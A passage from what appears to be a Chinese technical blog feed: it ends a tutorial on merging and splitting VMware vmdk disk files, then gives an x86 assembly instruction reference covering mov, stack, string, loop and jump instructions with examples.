data-language="bash"><code class="language-bash">vmware-vdiskmanager.exe <span class="token parameter variable">-r</span> <span class="token string">"不带 s 的 vmdk 文件路径"</span> <span class="token parameter variable">-t</span> <span class="token number">0</span> <span class="token string">"合并后新的单个 vmdk 磁盘文件的存放路径"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>完成后显示：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">  Convert: <span class="token number">100</span>% done.Virtual disk conversion successful.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>合并后得到新的磁盘文件：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E4%BB%8E%E7%89%A9%E7%90%86%E6%9C%BA%E6%8B%96%E5%88%B0Linux%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%AD%E7%9A%84%E6%96%87%E4%BB%B6%E6%B6%88%E5%A4%B1%E4%BA%8618.png" alt="从物理机拖到Linux虚拟机中的文件消失了18.png"></p><p>将之前 Kali 虚拟机目录下的 <code>Kali-2022.4.vmdk</code> 和 <code>Kali-2022.4-s001.vmdk ~ Kali-2022.4-s013.vmdk</code> 等等文件全部删除</p><p>将合并后的 <code>Kali-2022.4.vmdk</code> 文件移动到虚拟机目录下</p><p>无需做额外配置，直接开启虚拟机，可以正常开机</p><p>VM 中已经识别为单个硬盘文件：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E4%BB%8E%E7%89%A9%E7%90%86%E6%9C%BA%E6%8B%96%E5%88%B0Linux%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%AD%E7%9A%84%E6%96%87%E4%BB%B6%E6%B6%88%E5%A4%B1%E4%BA%8619.png" alt="从物理机拖到Linux虚拟机中的文件消失了19.png"></p><hr><h1 id="拆分-VM-单磁盘文件为多磁盘文件"><a href="#拆分-VM-单磁盘文件为多磁盘文件" class="headerlink" title="拆分 VM 单磁盘文件为多磁盘文件"></a>拆分 VM 单磁盘文件为多磁盘文件</h1><blockquote><p>在创建虚拟机时，若选择了将硬盘存储为单个文件，后续也可以将单个磁盘文件重新拆分为多个文件</p></blockquote><p><mark>首先关闭虚拟机</mark></p><p>在 VMware Workstation 的安装目录下</p><p>使用 <code>vmware-vdiskmanager.exe</code> 程序对单个 VM 磁盘文件 vmdk 进行拆分：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">vmware-vdiskmanager.exe <span class="token parameter variable">-r</span> <span class="token string">"vmdk 文件路径"</span> <span class="token parameter variable">-t</span> <span class="token number">1</span> <span class="token string">"拆分后新的 vmdk 磁盘文件的存放路径"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 日常 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日常 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>汇编指令系统</title>
      <link href="/posts/782a6e38.html"/>
      <url>/posts/782a6e38.html</url>
      
        <content type="html"><![CDATA[<h1 id="操作指令"><a href="#操作指令" class="headerlink" title="操作指令"></a>操作指令</h1><blockquote><p>有些指令属于双操作数指令，双操作数指令必须满足：</p><ol><li><em>两个操作数的长度必须匹配</em></li><li><em>两个操作数不能同时为内存单元</em></li></ol></blockquote><hr><h2 id="mov"><a href="#mov" class="headerlink" title="mov"></a>mov</h2><blockquote><p><strong>数据传送指令</strong>。把一个字节、字或双字的操作数从源位置传送到目的位置，源操作数的内容不变，类似于复制操作</p></blockquote><ol><li><p>mov 属于双操作数指令，<strong>两个操作数的长度必须匹配</strong>：<br>正确：<code>mov ax, bx</code>（AX 为 16 位，BX 为 16 位）<br>错误：<code>mov ax, bh</code>（AX 为 16 位，BH 为 8 位）<br>正确：<code>mov al, &#39;A&#39;</code>（AL 为 8 位，<code>&#39;A&#39;</code> 会以字节 61h 的形式存进 AL）<br>正确：<code>mov ax, &#39;A&#39;</code>（AX 为 16 位，<code>&#39;A&#39;</code> 会以字 0061h 的形式存进 AX）<br>错误：<code>mov ah, 258</code>（AH 为 8 位，十进制 258 超出了 8 位二进制） </p></li><li><p>mov 属于双操作数指令，<strong>两个操作数不能同时为内存单元</strong>：<br>正确：<code>mov ax, [bx]</code>（AX 为寄存器，[BX] 为偏移地址，段地址默认在 DS 中）<br>错误：<code>mov [ax], [bx]</code>（[AX] 和 [BX] 都是偏移地址，段地址默认在 DS 中）</p></li><li><p><mark>mov 指令的目的操作数不能是 CS 或 IP，因为 CS:IP 指向当前要执行的指令所在的地址</mark></p></li><li><p>mov 指令中的操作数，如果是十六进制常数，且非数字开头，需要在前面加 0<br>正确：<code>mov ax, 0Dh</code><br>错误：<code>mov ax, Dh</code></p></li><li><p>mov 指令需要在指令中说明内存单元的类型，以便于操作数的长度匹配<br>正确：<code>mov [bx], ax</code>（由于 AX 为 16 位，因此 [BX] 必定指向字单元）<br>错误：<code>mov [bx], 0</code>（由于常数 0 没有类型，因此 [BX] 没有说明是字节单元还是字单元）<br>正确：<code>mov byte ptr [bx], 0</code>（<code>byteptr</code> 说明是字节操作，写一个字节单元）<br>正确：<code>mov word ptr [bx], 0</code>（<code>wordptr</code> 说明是字操作，写一个字单元）</p></li><li><p><mark>mov 指令不能直接将符号地址、段寄存器、立即数送往段寄存器，只能通过寄存器得到</mark><br>正确：<code>mov ax, dataseg     mov ds, ax</code>（先将 dataseg 送往 AX，再由 AX 送往 DS）<br>错误：<code>mov ds, dataseg</code>（不能直接将符号地址送往段寄存器）<br>错误：<code>mov ds, es</code>（不能直接将段寄存器送往段寄存器）<br>错误：<code>mov ds, 1234</code>（不能直接将立即数送往段寄存器）<br>错误：<code>mov cs, ax</code>（<strong>指令虽然合法，但是代码段寄存器不能赋值</strong>）</p></li></ol><ul><li>示例，假设 TABLE 是一个 16 位的变量，使用 mov 传送变量<br>正确：<code>mov bx, table</code>（将变量 TABLE 的值送往 BX）<br>错误：<code>mov bl, table</code>（BL 为 8 位，TABLE 为 16 位，操作数长度不一致）<br>错误：<code>mov [bx], table</code>（[BX] 和 TABLE 都是内存单元）<br>正确：<code>mov bx, offest table</code>（将变量 TABLE 的偏移地址送往 BX）<br>错误：<code>mov bl, offest table</code>（不论变量的类型如何，偏移地址总是 16 位，操作数长度不一致）</li></ul><hr><h3 id="movsb"><a href="#movsb" class="headerlink" title="movsb"></a>movsb</h3><blockquote><p><strong>串字节传送指令</strong>。将 DS:SI 指向的内存单元中的字节送入 ES:DI 中，然后根据标志寄存器 DF 位的值对 SI 和 DI 进行加一或减一</p></blockquote><ul><li>执行 <code>movsb</code> 指令相当于：</li></ul><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm"><span class="token punctuation">(</span><span class="token punctuation">(</span>es<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">16</span> <span class="token operator">+</span> <span class="token punctuation">(</span>di<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>ds<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">16</span> <span class="token operator">+</span> <span class="token punctuation">(</span>si<span class="token punctuation">)</span><span class="token punctuation">)</span>如果 DF <span class="token operator">=</span> <span class="token number">0</span>，则：<span class="token punctuation">(</span>si<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token punctuation">(</span>si<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">(</span>di<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token punctuation">(</span>di<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span>如果 DF <span class="token operator">=</span> <span class="token number">1</span>，则：<span class="token punctuation">(</span>si<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token punctuation">(</span>si<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">(</span>di<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token punctuation">(</span>di<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h3 id="movsw"><a href="#movsw" class="headerlink" title="movsw"></a>movsw</h3><blockquote><p><strong>串字传送指令</strong>。将 DS:SI 指向的内存单元中的字送入 ES:DI 中，然后根据标志寄存器 DF 位的值对 SI 和 DI 进行加二或减二</p></blockquote><ul><li>执行 <code>movsw</code> 指令相当于：</li></ul><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm"><span class="token punctuation">(</span><span class="token punctuation">(</span>es<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">16</span> <span class="token operator">+</span> <span class="token punctuation">(</span>di<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>ds<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">16</span> <span class="token operator">+</span> <span class="token punctuation">(</span>si<span class="token punctuation">)</span><span class="token punctuation">)</span>如果 DF <span class="token operator">=</span> <span class="token number">0</span>，则：<span class="token punctuation">(</span>si<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token punctuation">(</span>si<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">(</span>di<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token punctuation">(</span>di<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">2</span>如果 DF <span class="token operator">=</span> <span class="token number">1</span>，则：<span class="token punctuation">(</span>si<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token punctuation">(</span>si<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">(</span>di<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token punctuation">(</span>di<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">2</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="push-和-pop"><a href="#push-和-pop" class="headerlink" title="push 和 pop"></a>push 和 pop</h2><blockquote><p><strong>进栈和出栈指令</strong>。push 实现压入操作，将数据压入栈中；pop 实现弹出操作，将数据从栈上弹出到寄存器</p><p><mark>栈操作以字节为单位</mark></p></blockquote><table><thead><tr><th align="left">指令</th><th align="left">用法</th><th align="left">操作</th></tr></thead><tbody><tr><td align="left"><code>push</code></td><td align="left">push ax</td><td align="left"><strong>SP &#x3D; SP - 2</strong>，将寄存器 AX 中的数据送入栈中</td></tr><tr><td align="left"><code>pop</code></td><td align="left">pop ax</td><td align="left">从栈顶取出数据送入 AX 寄存器，<strong>SP &#x3D; SP + 2</strong></td></tr></tbody></table><ul><li>例如，执行如下代码：</li></ul><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm">mov ax<span class="token punctuation">,</span> 0123hpush axmov bx<span class="token punctuation">,</span> 2266hpush bxmov cx<span class="token punctuation">,</span> 1122hpush cxpop axpop bxpop cx<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/x86%E6%B1%87%E7%BC%96_%E6%A0%881.png" alt="x86汇编_栈1.png"></p><ul><li><p><code>push</code> 和 <code>pop</code> 操作可以在<em>寄存器和内存之间传送数据</em>：</p><ol><li>push&#x2F;pop <strong>寄存器</strong><br> <code>push ax</code><br> <code>pop bx</code></li><li>push&#x2F;pop <strong>段寄存器</strong><br> <code>push ds</code><br> <code>pop es</code></li></ol></li><li><p><code>push</code> 和 <code>pop</code> 操作还可以在<em>内存和内存之间传送数据</em>：</p><ol><li>push&#x2F;pop <strong>内存单元</strong>（可以只给出偏移地址，段地址在 DS 中）<br> <code>push [0]</code><br> <code>pop [2]</code></li></ol></li></ul><hr><h3 id="pushf-和-popf"><a href="#pushf-和-popf" class="headerlink" title="pushf 和 popf"></a>pushf 和 popf</h3><blockquote><p><strong>标志寄存器进栈和出栈指令</strong>。pushf 实现将标志寄存器 FLAG 的值入栈；popf 实现将栈中的数据从栈上弹出，送入标志寄存器 FLAG 中</p><p><mark>栈操作以字节为单位</mark></p></blockquote><ul><li><p><code>pushf</code> 和 <code>popf</code> 为直接访问标志寄存器提供了一种方法</p></li><li><p>例如：</p></li></ul><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm">mov ax<span class="token punctuation">,</span> <span class="token number">0</span>push axpopfmov ax<span class="token punctuation">,</span> 0FFF0hadd ax<span class="token punctuation">,</span> 0010hpushfpop axand al<span class="token punctuation">,</span> 11000101band ah<span class="token punctuation">,</span> 00001000b<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/x86%E6%B1%87%E7%BC%96_pushf%E5%92%8Cpopf1.png" alt="x86汇编_pushf和popf1.png"></p><p>如上图，执行程序后 AX &#x3D; 0045h，过程如下：</p><ol><li>执行到 <code>popf</code> 这一条指令时，将栈中的 AX &#x3D; 0 弹出到 FLAG 寄存器，即：FLAG &#x3D; 0<br>此时 ZF &#x3D; 0，PF &#x3D; 0，SF &#x3D; 0，CF &#x3D; 0，OF &#x3D; 0，DF &#x3D; 0</li><li>当 <code>add ax, 0010h</code> 时，计算结果为 0（ZF），有偶数个 1（PF），存在进位（CF）<br>此时 ZF &#x3D; 1，PF &#x3D; 1，SF &#x3D; 0，CF &#x3D; 1，OF &#x3D; 0，DF &#x3D; 0</li></ol><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm">   <span class="token number">1111111111110000</span><span class="token operator">+</span>  <span class="token number">0000000000010000</span>   <span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span> <span class="token number">1</span> <span class="token number">0000000000000000</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ol start="3"><li>当 <code>pushf</code> 时，将 FLAG 寄存器的值 0000000001000111b &#x3D; 0047h 入栈，并通过 <code>pop ax</code> 弹出到 AX 中，AX &#x3D; 0000000001000111b &#x3D; 0047h</li><li>执行 <code>and al, 11000101b</code> 和 <code>and ah, 00001000b</code> 计算后，AX &#x3D; 0000000001000101b &#x3D; 0045h</li></ol><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm">     <span class="token number">11000101</span>and  <span class="token number">01000111</span>     <span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>     <span class="token number">01000101</span>     <span class="token number">00001000</span>and  <span class="token number">00000000</span>     <span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>     <span class="token number">00000000</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="xchg"><a href="#xchg" class="headerlink" title="xchg"></a>xchg</h2><blockquote><p><strong>交换指令</strong>。实现将两个操作数互换位置，寄存器和内存变量之间的类型必须相同，可以是一个字节、一个字或双字</p><p>注意：<mark>xchg 也是双操作数指令，须遵循双操作数指令的要求</mark></p></blockquote><ul><li>示例：<br>正确：<code>xchg ax, bx</code>（AX 与 BX 长度相同，交换 AX 与 BX 中的值）<br>正确：<code>xchg ax, [bx]</code>（AX 为 16 位，所以 [BX] 也指向字单元）<br>正确：<code>xchg ax, var</code>（AX 为 16 位，所以 var 必须为字变量）<br>错误：<code>xchg ax, 5</code>（<mark>操作数不能为立即数</mark>）<br>错误：<code>xchg [bx], var</code>（两个操作数不能同时为内存单元）<br>错误：<code>xchg ax, bh</code>（两个操作数长度不一致）</li></ul><hr><h2 id="rep"><a href="#rep" class="headerlink" title="rep"></a>rep</h2><blockquote><p><strong>重复指令</strong>。根据 CX 的值，重复执行后面的串传送指令</p></blockquote><ul><li>例如：<code>rep movsb</code> 等价于：</li></ul><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm">s:movsbloop s<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>串字节传送指令 movsb 配合 rep 指令使用，每执行一次 movsb 指令 SI 和 DI 都会递增或递减（根据标志寄存器 DF 位的值），因此 <code>rep movsb</code> 可以循环实现 CX 个字符的传送</p><ul><li>同理，<code>rep movsw</code> 等价于：</li></ul><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm">s:movswloop s<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><hr><h2 id="lea"><a href="#lea" class="headerlink" title="lea"></a>lea</h2><blockquote><p><strong>取偏移地址指令</strong>。与 mov 指令类似，也有数据传送的功能，但 lea 主要是用来将一个内存地址直接赋给目的操作数，而 mov 主要是将数值赋值给目的操作数</p><p>即：<em>lea 传的是地址，mov 传的是值</em></p></blockquote><ul><li>lea 指令与 mov 指令的区别：</li></ul><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm">mov eax<span class="token punctuation">,</span> <span class="token punctuation">[</span>ebx<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">]</span>   <span class="token comment">; 把内存地址为 ebx+8 处存放的数据赋给 eax</span>lea eax<span class="token punctuation">,</span> <span class="token punctuation">[</span>ebx<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">]</span>   <span class="token comment">; 把 ebx+8 这个值 (内存地址) 直接赋给 eax, 而不是把 ebx+8 处的内存地址里的数据赋给 eax</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><blockquote><p>总而言之：</p><ol><li>lea 指令的功能是取偏移地址，例如：<code>lea ax, [1000H]</code>，作用是将源操作数 [1000H] 的偏移地址 1000H 送至 ax</li><li>mov 指令的功能是传送数据，例如：<code>mov ax, [1000H]</code>，作用是将 1000H 作为偏移地址，寻址找到内存单元，将该内存单元中的数据送至 ax</li></ol></blockquote><ul><li>指令 <code>lea eax, [ebx+8]</code> 等价于：</li></ul><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm">add ebx<span class="token punctuation">,</span> <span class="token number">8</span>mov eax<span class="token punctuation">,</span> ebx<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>虽然这两段指令的功能等价，但是直接用 lea 指令比用 mov 指令来实现 lea 指令的机器码要短，更简洁</strong></p><ul><li>指令 <code>lea ax, table</code> 等价于：</li></ul><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm">mov ax<span class="token punctuation">,</span> offset table<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>但也有时候 lea 指令不能直接使用 mov 代替</li></ul><p>例如：<code>lea ax, [si+6]</code> 不能直接替换成 <code>mov ax, si+6</code><br>但可以替换成：</p><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm">mov ax<span class="token punctuation">,</span> siadd ax<span class="token punctuation">,</span> <span class="token number">6</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><hr><h2 id="enter-和-leave"><a href="#enter-和-leave" class="headerlink" title="enter 和 leave"></a>enter 和 leave</h2><blockquote><p><strong>函数开始时的保存指令和函数返回前的清理指令</strong>。通常，enter 指令会在函数的开始执行，用于保存函数调用之前的栈帧，leave 指令会在函数末尾执行（紧跟在 ret 指令之前），用于恢复函数调用前的栈帧</p></blockquote><ul><li><code>enter</code> 指令等价于：</li></ul><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm">push ebpmov ebp<span class="token punctuation">,</span> esp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><code>enter</code> 指令一般用于函数的开始，保存函数调用之前的栈帧信息</p><ul><li><code>leave</code> 指令等价于：</li></ul><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm">mov esp<span class="token punctuation">,</span> ebp  <span class="token comment">; 恢复栈指针</span>pop ebp       <span class="token comment">; 恢复基址指针</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>在函数调用前，<code>ebp</code> 通常被用作栈帧基址指针，而在函数返回前，通过 <code>leave</code> 指令来还原栈帧，<code>leave</code> 和 <code>ret</code> 配合共同完成了子函数的返回</p><ul><li>以一般函数调用为例：</li></ul><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm">main:...call fun...fun:push ebpmov ebp<span class="token punctuation">,</span> esp...leaveretn<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="循环指令"><a href="#循环指令" class="headerlink" title="循环指令"></a>循环指令</h1><h2 id="loop"><a href="#loop" class="headerlink" title="loop"></a>loop</h2><blockquote><p><strong>循环指令</strong>。loop 指令的格式为 <code>loop 标号</code>，通常<strong>用 CX 来存放循环次数</strong></p><p>CPU 在执行 <code>loop 标号</code> 时，机器码中不包含转移的目的地址，包含的是转移的位移</p></blockquote><ul><li><p>执行 loop 指令时，要进行两步：</p><ol><li><code>(CX) = (CX) - 1</code></li><li><strong>判断 CX 中的值，不为 0 则转至标号处执行，为 0 就向下执行（循环结束）</strong></li></ol></li><li><p>例如，实现计算 $2 ^ {12}$：</p></li></ul><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm">assume cs:codecode segmentmov ax<span class="token punctuation">,</span> <span class="token number">2</span>mov cx<span class="token punctuation">,</span> <span class="token number">11</span>s:add ax<span class="token punctuation">,</span> axloop smov ax<span class="token punctuation">,</span> 4c00hint 21hcode endsend<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>除此之外，还有其他循环指令：<ol><li>先将 CX 减 1</li><li>然后根据测试条件决定是否转移</li></ol></li></ul><table><thead><tr><th align="left">指令</th><th align="left">循环条件</th><th align="left">含义</th></tr></thead><tbody><tr><td align="left"><code>loop</code></td><td align="left">CX ≠ 0</td><td align="left">循环</td></tr><tr><td align="left"><code>loopz</code>、<code>loope</code></td><td align="left">ZF &#x3D; 1 且 CX ≠ 0</td><td align="left">当为 0 时循环</td></tr><tr><td align="left"><code>loopnz</code>、<code>loopne</code></td><td align="left">ZF &#x3D; 0 且 CX ≠ 0</td><td align="left">当不为 0 时循环</td></tr></tbody></table><hr><h1 id="转移指令"><a href="#转移指令" class="headerlink" title="转移指令"></a>转移指令</h1><blockquote><p><strong>可以修改 IP，或者可以同时修改 CS 和 IP 的指令统称为转移指令</strong>。即：转移指令就是可以控制 CPU 执行内存中某处代码的指令</p></blockquote><ul><li><p>8086CPU 的转移行为分为两类：</p><ol><li><strong>段内转移</strong>：只修改 IP 的值，例如 <code>jmp ax</code></li><li><strong>段间转移</strong>：同时修改 CS 和 IP 的值，例如 <code>jmp 1000:0</code></li></ol></li><li><p>根据转移指令对 IP 的修改范围不同可分为两类：</p><ol><li><strong>段内短转移</strong>：IP 的修改范围为 <code>-128 ~ 127</code></li><li><strong>段内近转移</strong>：IP 的修改范围为 <code>-32768 ~ 32767</code></li></ol></li><li><p>8086CPU 的转移指令可分为五类：</p><ol><li><strong>无条件转移指令</strong>（例如：<code>jmp</code>）</li><li><strong>条件转移指令</strong>（例如：<code>jz</code>、<code>jnz</code>）</li><li><strong>循环指令</strong>（例如：<code>loop</code>）</li><li><strong>过程</strong></li><li><strong>中断</strong></li></ol></li></ul><blockquote><p>根据位移进行转移的指令，机器码中不包含目的地址，包含的是转移的位移：<br><code>jmp short 标号</code><br><code>jmp near ptr 标号</code><br><code>jcxz 标号</code><br><code>loop 标号</code></p><p>例如：<code>loop s</code> 对应的机器码可能是 <code>E2 FC</code>，<code>jmp short s</code> 对应的机器码可能是 <code>EB 03</code>，<code>FC</code> 和 <code>03</code> 都是位移，而不是真实的地址</p><p>这样的好处在于：代码装在内存的不同位置都可以正确执行，如果包含的是目的地址，就会对偏移地址有严格的限制，一旦指令不在目的地址处就会发生错误</p></blockquote><hr><h2 id="无条件转移指令"><a href="#无条件转移指令" class="headerlink" title="无条件转移指令"></a>无条件转移指令</h2><blockquote><p>jmp 为无条件转移指令，可以只修改 IP，也可以同时修改 CS 和 IP</p></blockquote><p>jmp 指令要给出两种信息：</p><ol><li>转移的目的地址</li><li>转移的距离（段间转移、段内短转移、段内近转移）</li></ol><hr><h3 id="jmp-short-标号"><a href="#jmp-short-标号" class="headerlink" title="jmp short 标号"></a>jmp short 标号</h3><blockquote><p><strong>段内短转移</strong>，IP 修改范围为 <code>-128 ~ 127</code>，即：向前转移最多可越过 128 字节，向后转移最多可越过 127 字节</p><p>CPU 在执行 <code>jmp short 标号</code> 时，机器码中不包含转移的目的地址，包含的是转移的位移</p></blockquote><ul><li><p><code>jmp short 标号</code> 的功能为：(IP) &#x3D; (IP) + 8 位位移</p></li><li><p>jmp 指令中 short 指明段内短转移，标号指明要转移的目的地，转移指令结束后，CS:IP 指向标号处的指令</p></li><li><p>例如：</p></li></ul><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm">assume cs:codesgcodesg segmentstart:  mov ax<span class="token punctuation">,</span> <span class="token number">0</span>jmp short sadd ax<span class="token punctuation">,</span> <span class="token number">1</span>s:inc axcodesg endsend start<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>执行后 AX &#x3D; 1，因为执行 <code>jmp short s</code> 后越过了 <code>add ax, 1</code> 直接执行 <code>inc ax</code></p><hr><h3 id="jmp-near-ptr-标号"><a href="#jmp-near-ptr-标号" class="headerlink" title="jmp near ptr 标号"></a>jmp near ptr 标号</h3><blockquote><p><strong>段内近转移</strong>，IP 修改范围为 <code>-32768 ~ 32767</code>，即：向前转移最多可越过 32768 字节，向后转移最多可越过 32767 字节</p><p>CPU 在执行 <code>jmp near ptr 标号</code> 时，机器码中不包含转移的目的地址，包含的是转移的位移</p></blockquote><ul><li><p><code> jmp near ptr 标号</code> 的功能为：(IP) &#x3D; (IP) + 16 位位移</p></li><li><p>jmp 指令中 near ptr 指明段内近转移，标号指明要转移的目的地，转移指令结束后，CS:IP 指向标号处的指令</p></li></ul><hr><h3 id="jmp-far-ptr-标号"><a href="#jmp-far-ptr-标号" class="headerlink" title="jmp far ptr 标号"></a>jmp far ptr 标号</h3><blockquote><p><strong>段间转移（远转移）</strong></p><p>(CS) &#x3D; 标号所在段的段地址<br>(IP) &#x3D; 标号在段中的偏移地址</p><p>CPU 在执行 <code> jmp far ptr 标号</code> 时，机器码中包含转移的目的地址</p></blockquote><ul><li><p>jmp 指令中 far ptr 指明指令用标号的段地址和偏移地址修改 CS 和 IP</p></li><li><p>例如：</p></li></ul><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm">assume cs:codesgcodesg segmentstart:  mov ax<span class="token punctuation">,</span> <span class="token number">0</span>mov bx<span class="token punctuation">,</span> <span class="token number">0</span>jmp far ptr sdb <span class="token number">256</span> dup <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>s:add ax<span class="token punctuation">,</span> <span class="token number">1</span>inc axcodesg endsend start<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h3 id="jmp-十六位寄存器"><a href="#jmp-十六位寄存器" class="headerlink" title="jmp 十六位寄存器"></a>jmp 十六位寄存器</h3><blockquote><p>这种 jmp 指令可仅修改 IP 的值</p></blockquote><ul><li><p><code>jmp 十六位寄存器</code> 的功能为：<code>mov IP, 十六位寄存器</code></p></li><li><p>例如：</p></li></ul><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm">mov ax<span class="token punctuation">,</span> 1000hjmp ax<span class="token comment">; 执行后，CS:IP 指向 CS:1000</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><hr><h3 id="jmp-word-ptr-内存单元"><a href="#jmp-word-ptr-内存单元" class="headerlink" title="jmp word ptr 内存单元"></a>jmp word ptr 内存单元</h3><blockquote><p><strong>段内间接转移</strong>，从内存单元地址处开始的一个字，是转移的目的偏移地址</p><p>内存单元地址可以用寻址方式的任一格式给出</p></blockquote><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm">mov ax<span class="token punctuation">,</span> 0123hmov ds:<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> axjmp word ptr ds:<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token comment">; 执行后 (IP) = 0123h</span>mov ax<span class="token punctuation">,</span> 4567hmov <span class="token punctuation">[</span>bx<span class="token punctuation">]</span><span class="token punctuation">,</span> axjmp word ptr <span class="token punctuation">[</span>bx<span class="token punctuation">]</span><span class="token comment">; 执行后 (IP) = 4567h</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>假设 BX &#x3D; 2000h，DS &#x3D; 4000h，(42000h) &#x3D; 6050h，(44000h) &#x3D; 8090h，table 的偏移地址为 2000h</li></ul><pre class="line-numbers language-armasm" data-language="armasm"><code 